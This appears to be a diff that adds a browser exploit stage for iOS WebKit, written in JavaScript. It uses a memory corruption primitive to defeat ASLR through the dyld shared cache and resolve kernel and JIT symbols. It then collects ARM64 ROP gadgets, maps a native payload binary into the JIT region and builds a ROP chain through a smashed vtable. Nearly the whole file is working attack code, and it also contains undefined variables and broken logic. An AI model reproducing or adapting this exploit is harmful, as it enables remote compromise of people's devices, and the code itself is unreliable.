@@ -1,0 +1,1733 @@
+<iframe id="victim"></iframe>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+// Return the hexadecimal representation of the given byte.
+/*function lo (f64) {
+    return parseInt(("0000000000000000" + f64.toString(16).substr   (-8,8),16) | 0)
+
+}*/
+/*function lo (f64) {
+    return parseInt(("0000000000000000" + f64.toString().substr(-8,8),16))
+}*/
+let fail = function (x)
+    {
+        alert('FAIL: ' + x);
+        location.reload();
+        throw null;
+    }
+    let b2u32 = function (b)
+    {
+        return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
+    }
+    function off2addr(segs, off)
+    {
+        if(!(off instanceof Int64)) off = new Int64(off);
+        for(var i = 0; i < segs.length; ++i)
+        {
+            var start = segs[i].fileoff;
+            var end   = Add(start, segs[i].size);
+            if
+            (
+                (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
+                (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
+            )
+            {
+                return Add(segs[i].addr, Sub(off, start));
+            }
+        }
+        return new Int64("0x4141414141414141");
+    }
+
+    function fsyms(mem, base, segs, want, syms)
+    {
+        want = Array.from(want); // copy
+        if(syms === undefined)
+        {
+            syms = {};
+        }
+
+        var stab = null;
+        var ncmds = mem.u32(Add(base, 0x10));
+        for(var i = 0, off = 0x20; i < ncmds; ++i)
+        {
+            var cmd = mem.u32(Add(base, off));
+            if(cmd == 0x2) // LC_SYMTAB
+            {
+                var b = mem.read(Add(base, off + 0x8), 0x10);
+                stab =
+                {
+                    symoff:  b2u32(b.slice(0x0, 0x4)),
+                    nsyms:   b2u32(b.slice(0x4, 0x8)),
+                    stroff:  b2u32(b.slice(0x8, 0xc)),
+                    strsize: b2u32(b.slice(0xc, 0x10)),
+                };
+                break;
+            }
+            off += mem.u32(Add(base, off + 0x4));
+        }
+        if(stab == null)
+        {
+            fail("stab");
+        }
+        var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
+        var fn = function(i)
+        {
+            return mem.read(Add(tmp.base, tmp.off + i), 1)[0];
+        };
+        for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
+        {
+            tmp.off = mem.u32(off2addr(segs, stab.symoff + i * 0x10));
+            for(var j = 0; j < want.length; ++j)
+            {
+                var s = want[j];
+                if((strcmp(fn, s)))
+                {
+                    syms[s] = mem.readInt64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
+                    want.splice(j, 1);
+                    break;
+                }
+            }
+        }
+        return syms;
+    }
+
+    function strcmp(b, str)
+    {
+        var fn = typeof b == "function" ? b : function(i) { return b[i]; };
+        for(var i = 0; i < str.length; ++i)
+        {
+            if(fn(i) != str.charCodeAt(i))
+            {
+                return false;
+            }
+        }
+        return fn(str.length) == 0;
+    }
+    function _read(i, l)
+    {
+        if (i instanceof Int64) i = i.lo();
+        if (l instanceof Int64) l = l.lo();
+        if (i + l > this.length)
+        {
+            fail(`OOB read: ${i} -> ${i + l}, size: ${l}`);
+        }
+        return this.slice(i, i + l);
+    }
+
+    function _readInt64(addr)
+    {
+        return new Int64(_read(addr, 8));
+    }
+
+    function _writeInt64(i, val)
+    {
+        if (i instanceof Int64) i = i.lo();
+        this.set(val.bytes(), i);
+    }
+
+    function _u32(i)
+    {
+        return b2u32(_read(i, 4));
+    }
+
+    
+
+    let spyware = function(memory, binary, vtab_addr)
+    {
+        alert(`binary length: ${hexit(binary.length)}`)
+
+        //alert('spyware')
+        /*var wrapper = document.createElement("div")
+        var wrapper_addr = memory.addrof(wrapper)
+
+        var el_addr = memory.read_i64(Add(wrapper_addr, new Int64('0x18')),0)
+        alert(el_addr);
+        var vtab = memory.read_i64(el_addr,0)
+        alert("vtab@" + vtab);
+        */
+
+        memory.u32 = _u32;
+
+        // regloader:
+        // 0x180ee6048      e00317aa       mov x0, x23
+        // 0x180ee604c      e10316aa       mov x1, x22
+        // 0x180ee6050      e20318aa       mov x2, x24
+        // 0x180ee6054      e30319aa       mov x3, x25
+        // 0x180ee6058      e4031aaa       mov x4, x26
+        // 0x180ee605c      e5031baa       mov x5, x27
+        // 0x180ee6060      80033fd6       blr x28
+
+        // dispatch:
+        // 0x180d62e48      a0023fd6       blr x21
+        // 0x180d62e4c      fd7b43a9       ldp x29, x30, [sp, 0x30]
+        // 0x180d62e50      f44f42a9       ldp x20, x19, [sp, 0x20]
+        // 0x180d62e54      f65741a9       ldp x22, x21, [sp, 0x10]
+        // 0x180d62e58      ff030191       add sp, sp, 0x40
+        // 0x180d62e5c      c0035fd6       ret
+
+        // alt dispatch:
+        // 0x1811a37f0      a0023fd6       blr x21
+        // 0x1811a37f4      bf8300d1       sub sp, x29, 0x20
+        // 0x1811a37f8      fd7b42a9       ldp x29, x30, [sp, 0x20]
+        // 0x1811a37fc      f44f41a9       ldp x20, x19, [sp, 0x10]
+        // 0x1811a3800      f657c3a8       ldp x22, x21, [sp], 0x30
+        // 0x1811a3804      c0035fd6       ret
+
+        // stackloader:
+        // 0x18098e2a8      fd7b46a9       ldp x29, x30, [sp, 0x60]
+        // 0x18098e2ac      f44f45a9       ldp x20, x19, [sp, 0x50]
+        // 0x18098e2b0      f65744a9       ldp x22, x21, [sp, 0x40]
+        // 0x18098e2b4      f85f43a9       ldp x24, x23, [sp, 0x30]
+        // 0x18098e2b8      fa6742a9       ldp x26, x25, [sp, 0x20]
+        // 0x18098e2bc      fc6f41a9       ldp x28, x27, [sp, 0x10]
+        // 0x18098e2c0      ffc30191       add sp, sp, 0x70
+        // 0x18098e2c4      c0035fd6       ret
+
+        // alt stackloader:
+        // 0x1811b4aa4      bf4301d1       sub sp, x29, 0x50
+        // 0x1811b4aa8      fd7b45a9       ldp x29, x30, [sp, 0x50]
+        // 0x1811b4aac      f44f44a9       ldp x20, x19, [sp, 0x40]
+        // 0x1811b4ab0      f65743a9       ldp x22, x21, [sp, 0x30]
+        // 0x1811b4ab4      f85f42a9       ldp x24, x23, [sp, 0x20]
+        // 0x1811b4ab8      fa6741a9       ldp x26, x25, [sp, 0x10]
+        // 0x1811b4abc      fc6fc6a8       ldp x28, x27, [sp], 0x60
+        // 0x1811b4ac0      c0035fd6       ret
+
+        // __longjmp:
+        // 0x180700ad4      135040a9       ldp x19, x20, [x0]
+        // 0x180700ad8      155841a9       ldp x21, x22, [x0, 0x10]
+        // 0x180700adc      176042a9       ldp x23, x24, [x0, 0x20]
+        // 0x180700ae0      196843a9       ldp x25, x26, [x0, 0x30]
+        // 0x180700ae4      1b7044a9       ldp x27, x28, [x0, 0x40]
+        // 0x180700ae8      1d7845a9       ldp x29, x30, [x0, 0x50]
+        // 0x180700aec      1d0846a9       ldp x29, x2, [x0, 0x60]
+        var slide1 = 0xdc835520;
+        //var tmp = vtab_addr - ;
+        alert("tmp slide:" + tmp);
+        let cnt = 0;
+    var ccc = 0;
+        // you can also dump
+    // the modules from memory here,
+    // to compute gadgets later on..
+    for (let i = 0; i < 1000000; i++){
+        
+        cnt += 0x8;
+        tmp = Add(tmp, new Int64('0x8'));               
+        let tmp_mem2 = memory.read64(tmp);
+        let str = new Int64(tmp_mem2).toString();        
+        if (str.includes('00000000')                // execute the WebCore+0x8 illigel instruction..
+            ){
+            memory.write16(vtab_addr,tmp);            
+            d.dispatchEvent(new Event('click'));                      
+        }
+    }
+        var anchor = memory.read8(vtab_addr);
+        alert("anchor@" + anchor);
+       // alert("lo" + b2u32( anchor))
+        //var hdr = Sub(anchor, anchor & 0xfff);
+         var arrayBuf = new Uint8Array(memory.read8(anchor));
+        var header = b2u32(arrayBuf.slice(0, 4)); //
+        var b = [];
+        while(true)
+        {
+            if(strcmp(header, "dyld_v1 arm64"))
+            {
+                alert("actual header address:" + hdr)
+                break;
+            }
+            var anchor = Sub(anchor, 0x1000);
+            alert(header)
+        }
+        
+        var base_seg = null;
+        var nsegs    = memory.u32(hdr + 0x14);
+        var segdata  = memory.read64(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
+        var segs     = [];
+        for(var i = 0; i < nsegs; ++i)
+        {
+            var off = i * 0x20;
+            var seg =
+            {
+                addr:     new Int64(segdata.slice(off +  0x0, off +  0x8)),
+                size:     new Int64(segdata.slice(off +  0x8, off + 0x10)),
+                fileoff:  new Int64(segdata.slice(off + 0x10, off + 0x18)),
+                maxprot:  b2u32(segdata.slice(off + 0x18, off + 0x1c)),
+                initprot: b2u32(segdata.slice(off + 0x1c, off + 0x20))
+            };
+            segs.push(seg);
+            if(seg.fileoff.hi() == 0 && seg.fileoff.lo() == 0 && (seg.size.hi() != 0 || seg.size.lo() != 0))
+            {
+                base_seg = seg;
+            }
+        }
+        if(base_seg == null)
+        {
+            fail("base_seg");
+        }
+        var cache_slide = Sub(hdr, base_seg.addr);
+        alert("cacheslide:" + hexit(cacheslide));
+        for(var i = 0; i < segs.length; ++i)
+        {
+            segs[i].addr = Add(segs[i].addr, cache_slide);
+        }
+        var libs =
+        {
+            "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp", "__platform_memmove"],
+            "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
+            "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
+            "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
+                "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
+                "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
+            ],
+        };
+
+        var opcodes;
+        var opcode_libs;
+
+        if (/\b10_\S+ like Mac OS X/.test(navigator.userAgent)) {
+            //alert('found iPhone OS 10')
+            opcodes = {
+                // mov x0, x23; mov x1, x22; mov x2, x24; mov x3, x25; mov x4, x26; mov x5, x27; blr x28
+                "regloader":   [ 0xaa1703e0, 0xaa1603e1, 0xaa1803e2, 0xaa1903e3, 0xaa1a03e4, 0xaa1b03e5, 0xd63f0380 ],
+                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
+                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
+                // blr x21; sub sp, x29, 0x20; ldp x29, x30, [sp, 0x20]; ldp x20, x19, [sp, 0x10]; ldp x22, x21, [sp], 0x30; ret
+                "altdispatch": [ 0xd63f02a0, 0xd10083bf, 0xa9427bfd, 0xa9414ff4, 0xa8c357f6, 0xd65f03c0 ],
+                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
+                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
+                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+                // sub sp, x29, 0x50; ldp x29, x30, [sp, 0x50]; ldp x20, x19, [sp, 0x40]; ldp x22, x21, [sp, 0x30];
+                // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret
+                "altstackloader": [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ],
+            };
+
+            opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
+        } else {
+            //alert('found iPhone OS != 10')
+            libs["/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore"].push(
+                "__ZN3JSC29jitWriteSeparateHeapsFunctionE"
+            )
+
+            opcodes = {
+                // ldr x8, [sp] ; str x8, [x19] ; ldp x29, x30, [sp, #0x20] ; ldp x20, x19, [sp, #0x10] ; add sp, sp, #0x30 ; ret
+                "ldrx8":       [0xf94003e8, 0xf9000268, 0xa9427bfd, 0xa9414ff4, 0x9100c3ff, 0xd65f03c0],
+                // blr x21; ldp x29, x30, [sp, 0x30]; ldp x20, x19, [sp, 0x20]; ldp x22, x21, [sp, 0x10]; add sp, sp, 0x40; ret
+                "dispatch":    [ 0xd63f02a0, 0xa9437bfd, 0xa9424ff4, 0xa94157f6, 0x910103ff, 0xd65f03c0 ],
+                // mov x3, x22 ; mov x6, x27 ; mov x0, x24 ; mov x1, x19 ; mov x2, x23 ; ldr x4, [sp] ; blr x8
+                "regloader":   [ 0xaa1603e3, 0xaa1b03e6, 0xaa1803e0, 0xaa1303e1, 0xaa1703e2, 0xf94003e4, 0xd63f0100 ],
+                // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
+                // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
+                "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+                // mov x4, x20 ; blr x8
+                "movx4":       [ 0xaa1403e4, 0xd63f0100 ],
+                // ldr x0, [x0] -- for debugging
+                "ldrx0x0":     [ 0xf9400000 ],
+            }
+            opcode_libs = [
+                "/usr/lib/PN548.dylib",     // dispatch, stackloader
+                "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
+            ];
+        }
+        //alert('lookin through cache');
+
+        var syms = {};
+        var gadgets = {};
+        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
+        var nimgs = memory.u32(Add(hdr, 0x1c));
+        for(var i = 0; i < nimgs; ++i)
+        {
+            var straddr = off2addr(segs, memory.u32(Add(imgs, i * 0x20 + 0x18)));
+            var fn = function(i)
+            {
+                return memory.read(Add(straddr, i), 1)[0];
+            };
+            var base = Add(memory.read8(Add(imgs, i * 0x20)), cache_slide);
+            if(opcode_libs.some(lib => strcmp(fn, lib)))
+            {
+                var ncmds = memory.u32(Add(base, 0x10));
+                for(var j = 0, off = 0x20; j < ncmds; ++j)
+                {
+                    var cmd = memory.u32(Add(base, off));
+                    if(cmd == 0x19 && strcmp(memory.read(Add(base, off + 0x8), 0x10), "__TEXT")) // LC_SEGMENT_64
+                    {
+                        var nsects = memory.u32(Add(base, off + 0x40));
+                        for(var k = 0, o = off + 0x48; k < nsects; ++k)
+                        {
+                            if(strcmp(memory.read(Add(base, o), 0x10), "__text"))
+                            {
+                                var keys = Object.keys(opcodes).filter(k=>!gadgets.hasOwnProperty[k])
+                                if (keys.length == 0) break;
+                                var match = {};
+                                for(var z = 0; z < keys.length; ++z)
+                                {
+                                    match[keys[z]] = 0;
+                                }
+
+                                var addr = Add(memory.read8(Add(base, o + 0x20)), cache_slide)
+                                var size = memory.u32(Add(base, o + 0x28))
+
+                                // Copy the entire __text region into a Uint32Array for faster processing.
+                                // Previously you could map a Uint32Array over the data, but on i7+ devices
+                                // this caused access violations.
+                                // Instead we read the entire region and copy it into a Uint32Array. The
+                                // memory.read primitive has a weird limitation where it's only able to read
+                                // up to 4096 bytes. to get around this we'll read multiple times and combine
+                                // them into one.
+
+                                var allData = new Uint32Array(size / 4)
+                                for (var r = 0; r < size; r += 4096) {
+                                    // Check to ensure we don't read out of the region we want
+                                    var qty = 4096
+                                    if (size - r < qty) {
+                                        qty = size - r
+                                    }
+                                    var data = memory.read(Add(addr, r), qty)
+
+                                    // Data is an array of single bytes. This code takes four entries
+                                    // and converts them into a single 32-bit integer. It then adds it
+                                    // into the `allData` array at the given index
+                                    for (var h = 0; h < qty; h += 4) {
+                                        var fourBytes = b2u32(data.slice(h, h + 4))
+                                        allData[(r + h) / 4] = fourBytes
+                                    }
+                                }
+
+                                // Loop through the entire data map looking for each gadget we need
+                                for (var f = 0; f < size && keys.length > 0; f++) {
+                                    var op = allData[f]
+
+                                    for (var z = 0; z < keys.length; z++) {
+                                        var key = keys[z]
+                                        var opcode = opcodes[key]
+
+                                        if (op == opcode[match[key]]) {
+                                            match[key]++
+                                            if (match[key] == opcode.length) {
+                                                gadgets[key] = Add(addr, (f - (opcode.length - 1)) * 4)
+                                                keys.splice(z, 1)
+                                                break
+                                            }
+                                        } else {
+                                            match[key] = 0
+                                        }
+                                    }
+                                }
+
+                                break
+                            }
+                            o += 0x50;
+                        }
+                        break;
+                    }
+                    off += memory.u32(Add(base, off + 0x4));
+                }
+                continue;
+            }
+            var lookup = null;
+            for(var k = Object.keys(libs), j = 0; j < k.length; ++j)
+            {
+                if(strcmp(fn, k[j]))
+                {
+                    lookup = libs[k[j]];
+                    break;
+                }
+            }
+            if(lookup != null)
+            {
+                fsyms(memory, base, segs, lookup, syms);
+            }
+        }
+        if(!gadgets['dispatch'])
+        {
+            gadgets['dispatch'] = gadgets['altdispatch'];
+        }
+        if(!gadgets['stackloader'])
+        {
+            gadgets['stackloader'] = gadgets['altstackloader'];
+        }
+        delete opcodes['altdispatch'];
+        delete opcodes['altstackloader'];
+        var k = Object.values(libs).reduce(function(p,c){ c.forEach(function(e){ p.push(e) });return p; }, []);
+        for(var i = 0; i < k.length; ++i)
+        {
+            var s = k[i];
+            if(syms[s] == null)
+            {
+                fail(s);
+            }
+            syms[s] = Add(syms[s], cache_slide);
+        }
+        k = Object.keys(opcodes);
+        for(var i = 0; i < k.length; ++i)
+        {
+            var s = k[i];
+            if(gadgets[s] == null)
+            {
+                fail(s);
+            }
+        }
+
+        //alert('all gadgets found')
+        var longjmp             = syms["__longjmp"];
+        var regloader           = gadgets["regloader"];
+        var dispatch            = gadgets["dispatch"];
+        var stackloader         = gadgets["stackloader"];
+        var ldrx8               = gadgets["ldrx8"]; // might be undefined, then superb llvm gadgets are assumed
+        var movx4               = gadgets["movx4"]; // might be undefined, then superb llvm gadgets are assumed
+        var mach_task_self_     = new Int64(memory.read8(syms["_mach_task_self_"]).lo());
+        var mach_vm_protect     = syms["__kernelrpc_mach_vm_protect_trap"];
+        var memmove             = syms["__platform_memmove"];
+        var usleep              = syms["_usleep"];
+        var memPoolStart        = memory.read8(syms["__ZN3JSC32startOfFixedExecutableMemoryPoolE"]);
+        var memPoolEnd          = memory.read8(syms["__ZN3JSC30endOfFixedExecutableMemoryPoolE"]);
+
+        var jitWriteSeparateHeaps;
+        if (syms["__ZN3JSC29jitWriteSeparateHeapsFunctionE"]) {
+            jitWriteSeparateHeaps = memory.read8(syms["__ZN3JSC29jitWriteSeparateHeapsFunctionE"]);
+        } else {
+            jitWriteSeparateHeaps = Int64.Zero;
+        }
+
+        // This is easier than Uint32Array and dividing offset all the time
+        binary.u32 = _u32;
+        binary.read = _read;
+        binary.readInt64 = _readInt64;
+        binary.writeInt64 = _writeInt64;
+        var pstart = new Int64("0xffffffffffffffff");
+        var pend   = new Int64(0);
+        var ncmds  = binary.u32(0x10);
+        for(var i = 0, off = 0x20; i < ncmds; ++i)
+        {
+            var cmd = binary.u32(off);
+            if(cmd == 0x19) // LC_SEGMENT_64
+            {
+                var filesize = binary.readInt64(off + 0x30);
+                if(!(filesize.hi() == 0 && filesize.lo() == 0))
+                {
+                    var vmstart = binary.readInt64(off + 0x18);
+                    var vmsize = binary.readInt64(off + 0x20);
+                    var vmend = Add(vmstart, vmsize);
+
+                    if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() <= pstart.lo()))
+                    {
+                        pstart = vmstart;
+                    }
+                    if(vmend.hi() > pend.hi() || (vmend.hi() == pend.hi() && vmend.lo() > pend.lo()))
+                    {
+                        pend = vmend;
+                    }
+                }
+            }
+            off += binary.u32(off + 0x4);
+        }
+        var shsz = Sub(pend, pstart);
+        if(shsz.hi() != 0)
+        {
+            fail("shsz");
+        }
+        var payload = new Uint8Array(shsz.lo());
+        var paddr = memory.read8(Add(stage1.addrof(payload), 0x10));
+        var codeAddr = Sub(memPoolEnd, shsz);
+        codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
+        var shslide = Sub(codeAddr, pstart);
+        segs = [];
+        var off = 0x20;
+        for(var i = 0; i < ncmds; ++i)
+        {
+            var cmd = binary.u32(off);
+            if(cmd == 0x19) // LC_SEGMENT_64
+            {
+                var filesize = binary.readInt64(off + 0x30);
+                if(!(filesize.hi() == 0 && filesize.lo() == 0))
+                {
+                    var vmaddr   = binary.readInt64(off + 0x18);
+                    var vmsize   = binary.readInt64(off + 0x20);
+                    var fileoff  = binary.readInt64(off + 0x28);
+                    var prots    = binary.readInt64(off + 0x38); // lo=init_prot, hi=max_prot
+
+                    if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() <= filesize.lo()))
+                    {
+                        filesize = vmsize;
+                    }
+                    segs.push({
+                        addr:    Sub(vmaddr, pstart),
+                        size:    filesize,
+                        fileoff: fileoff,
+                        prots:   prots,
+                    });
+
+                    if(fileoff.hi() != 0)
+                    {
+                        fail("fileoff");
+                    }
+                    if(filesize.hi() != 0)
+                    {
+                        fail("filesize");
+                    }
+
+                    fileoff = fileoff.lo();
+                    filesize = filesize.lo();
+                    payload.set(binary.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
+                }
+            }
+            off += binary.u32(off + 0x4);
+        }
+
+        payload.u32 = _u32;
+        payload.read = _read;
+        payload.readInt64 = _readInt64;
+        var psyms = fsyms(payload, 0, segs, ["genesis"]);
+        if(psyms["genesis"] == null)
+        {
+            fail("genesis");
+        }
+        var jmpAddr = Add(psyms["genesis"], shslide);
+        //alert(`finna jmp ${jmpAddr}`)
+        
+        // hopefully we get better crash logs for the i7+ bug with this
+        // gets the GET parameter debug_with_vtab_smash
+        var params = location.search.substr(1).split("&");
+        for (var index = 0; index < params.length; index++) {
+                param = params[index].split("=");
+                if (param[0] == "debug_with_vtab_smash") {
+                    if (!confirm("You are running a debug feature, which will cause instability, if you weren't instructed to do so, please stop using it!")) {
+                        alert("Ok pls remove the arg and reload the site");
+                        throw "stop yo";
+                    }
+                    var max_smash = parseInt(decodeURIComponent(param[1]));
+                    if (isNaN(max_smash)) {
+                        throw "w00t I said ints...";
+                    }
+                    smash_int = new Int64("0x4241414141414141");
+                    for (let i = 0; i < max_smash;i += 8) {
+                        memory.writeInt64(Add(vtab,i), Add(smash_int,i));
+                    }
+                    alert("Smashed vtab! Pls get the newest crash log and show it to us");
+                }
+                if (param[0] == "dump_el_obj") {
+                    if (!confirm("You are running a debug feature, if you weren't instructed to do so, please stop using it!")) {
+                        alert("Ok pls remove the arg and reload the site");
+                        throw "stop yo";
+                    }
+                    var how_much = parseInt(decodeURIComponent(param[1]));
+                    if (isNaN(how_much)) {
+                        throw "w00t I said ints...";
+                    }
+                    how_much = how_much * 8; 
+                    data = "";
+                    for (let i = 0; i < how_much; i += 8) {
+                        data += hexlify(memory.read8(Add(wrapper_addr,i)).bytes) + "\n";
+                    }
+                    document.write(data);
+                    alert("Ok stoped running code now");
+                    throw "bye bye";
+                }
+        }
+
+        memory.writeInt64(Add(vtab, 0x18), longjmp);
+        memory.writeInt64(Add(el_addr, 0x58), stackloader);        // x30 (gadget)
+
+        var arrsz = 0x100000,
+            off   =   0x1000;
+        var arr   = new Uint32Array(arrsz);
+        var stack = memory.read8(Add(stage1.addrof(arr), 0x10));
+
+        var pos = arrsz - off;
+
+
+        var add_call_llvm = function(func, x0, x1, x2, x3, x4, jump_to) {
+            x4 = x4 || Int64.Zero
+
+            // in stackloader:
+            arr[pos++] = 0xdead0010;                // unused
+            arr[pos++] = 0xdead0011;                // unused
+            arr[pos++] = 0xdead0012;                // unused
+            arr[pos++] = 0xdead0013;                // unused
+            arr[pos++] = dispatch.lo();             // x28 (gadget for regloader)
+            arr[pos++] = dispatch.hi();             // x28 (gadget for regloader)
+            arr[pos++] = 0xdead0014;                // x27 (unused)
+            arr[pos++] = 0xdead0015;                // x27 (unused)
+            arr[pos++] = x4.lo();                   // x26 == x4 (arg5)
+            arr[pos++] = x4.hi();                   // x26 == x4 (arg5)
+            arr[pos++] = x3.lo();                   // x25 == x3 (arg4)
+            arr[pos++] = x3.hi();                   // x25 == x3 (arg4)
+            arr[pos++] = x2.lo();                   // x24 == x2 (arg3)
+            arr[pos++] = x2.hi();                   // x24 == x2 (arg3)
+            arr[pos++] = x0.lo();                   // x23 == x0 (arg1)
+            arr[pos++] = x0.hi();                   // x23 == x0 (arg1)
+            arr[pos++] = x1.lo();                   // x22 == x1 (arg2)
+            arr[pos++] = x1.hi();                   // x22 == x1 (arg2)
+            arr[pos++] = func.lo();                 // x21 (func)
+            arr[pos++] = func.hi();                 // x21 (func)
+            arr[pos++] = 0xdead0018;                // x20 (unused)
+            arr[pos++] = 0xdead0019;                // x20 (unused)
+            arr[pos++] = 0xdead001a;                // x19 (unused)
+            arr[pos++] = 0xdead001b;                // x19 (unused)
+            var tmppos = pos;
+            arr[pos++] = Add(stack, tmppos*4 + 0x40).lo(); // x29
+            arr[pos++] = Add(stack, tmppos*4 + 0x40).hi(); // x29
+            arr[pos++] = regloader.lo();            // x30 (first gadget)
+            arr[pos++] = regloader.hi();            // x30 (first gadget)
+
+            // after dispatch:
+            arr[pos++] = 0xdead0020;                // unused
+            arr[pos++] = 0xdead0021;                // unused
+            arr[pos++] = 0xdead0022;                // unused
+            arr[pos++] = 0xdead0023;                // unused
+            arr[pos++] = 0xdead0024;                // x22 (unused)
+            arr[pos++] = 0xdead0025;                // x22 (unused)
+            arr[pos++] = 0xdead0026;                // x21 (unused)
+            arr[pos++] = 0xdead0027;                // x21 (unused)
+            arr[pos++] = 0xdead0028;                // x20 (unused)
+            arr[pos++] = 0xdead0029;                // x20 (unused)
+            arr[pos++] = 0xdead002a;                // x19 (unused)
+            arr[pos++] = 0xdead002b;                // x19 (unused)
+            tmppos = pos;
+            arr[pos++] = Add(stack, tmppos*4 + 0x70).lo(); // x29
+            arr[pos++] = Add(stack, tmppos*4 + 0x70).hi(); // x29
+            arr[pos++] = jump_to.lo();              // x30 (gadget)
+            arr[pos++] = jump_to.hi();              // x30 (gadget)
+        }
+
+        var add_call_via_x8 = function(func, x0, x1, x2, x3, x4, jump_to) {
+            //alert(`add_call_via_x8: ${func}(${x0}, ${x1}, ${x2}, ${x3}, ${x4}, ${jump_to})`);
+            //x4 = x4 || Int64.One
+            // in stackloader:
+            arr[pos++] = 0xdead0010;                // unused
+            arr[pos++] = 0xdead0011;                // unused
+            arr[pos++] = 0xdead0012;                // unused
+            arr[pos++] = 0xdead0013;                // unused
+            arr[pos++] = 0xdead1101;                // x28 (unused)
+            arr[pos++] = 0xdead1102;                // x28 (unused)
+            arr[pos++] = 0xdead0014;                // x27 == x6 (unused)
+            arr[pos++] = 0xdead0015;                // x27 == x6 (unused)
+            arr[pos++] = 0xdead0016;                // x26 (unused)
+            arr[pos++] = 0xdead0017;                // x26 (unused)
+            arr[pos++] = x3.lo();                   // x25 == x3 (arg4)
+            arr[pos++] = x3.hi();                   // x25 == x3 (arg4)
+            arr[pos++] = x0.lo();                   // x24 == x0 (arg1)
+            arr[pos++] = x0.hi();                   // x24 == x0 (arg1)
+            arr[pos++] = x2.lo();                   // x23 == x2 (arg3)
+            arr[pos++] = x2.hi();                   // x23 == x2 (arg3)
+            arr[pos++] = x3.lo();                   // x22 == x3 (arg4)
+            arr[pos++] = x3.hi();                   // x22 == x3 (arg4)
+            arr[pos++] = func.lo();                 // x21 (target for dispatch)
+            arr[pos++] = func.hi();                 // x21 (target for dispatch)
+            arr[pos++] = 0xdead0018;                // x20 (unused)
+            arr[pos++] = 0xdead0019;                // x20 (unused)
+            var tmppos = pos;
+            arr[pos++] = Add(stack, tmppos*4).lo(); // x19 (scratch address for str x8, [x19])
+            arr[pos++] = Add(stack, tmppos*4).hi(); // x19 (scratch address for str x8, [x19])
+            arr[pos++] = 0xdead001c;                // x29 (unused)
+            arr[pos++] = 0xdead001d;                // x29 (unused)
+            arr[pos++] = ldrx8.lo();                // x30 (next gadget)
+            arr[pos++] = ldrx8.hi();                // x30 (next gadget)
+
+            // in ldrx8
+            if (x4) {
+                arr[pos++] = stackloader.lo();
+                arr[pos++] = stackloader.hi();
+            } else {
+                arr[pos++] = dispatch.lo();             // x8 (target for regloader)
+                arr[pos++] = dispatch.hi();             // x8 (target for regloader)
+            }
+            arr[pos++] = 0xdead1401;                // (unused)
+            arr[pos++] = 0xdead1402;                // (unused)
+            arr[pos++] = 0xdead1301;                // x20 (unused)
+            arr[pos++] = 0xdead1302;                // x20 (unused)
+            arr[pos++] = x1.lo();                   // x19 == x1 (arg2)
+            arr[pos++] = x1.hi();                   // x19 == x1 (arg2)
+            arr[pos++] = 0xdead1201;                // x29 (unused)
+            arr[pos++] = 0xdead1202;                // x29 (unused)
+            arr[pos++] = regloader.lo();            // x30 (next gadget)
+            arr[pos++] = regloader.hi();            // x30 (next gadget)
+
+            // in regloader
+            // NOTE: REGLOADER DOES NOT ADJUST SP!
+            // sometimes i didn't get expected value in x4
+            // and i have no fucking idea why
+            // usleep likely did the trick, but I would still keep the code
+            // with movx4
+            //arr[pos++] = x4.lo()                    // x4 (should be -- but see lines above)
+            //arr[pos++] = x4.hi()                    // x4 (should be -- but see lines above)
+
+            if (x4) {
+                // in stackloader:
+                arr[pos++] = 0xdaad0010;                // unused
+                arr[pos++] = 0xdaad0011;                // unused
+                arr[pos++] = 0xdaad0012;                // unused
+                arr[pos++] = 0xdaad0013;                // unused
+                arr[pos++] = 0xdaad1101;                // x28 (unused)
+                arr[pos++] = 0xdaad1102;                // x28 (unused)
+                arr[pos++] = 0xdaad0014;                // x27 == x6 (unused)
+                arr[pos++] = 0xdaad0015;                // x27 == x6 (unused)
+                arr[pos++] = 0xdaad0016;                // x26 (unused)
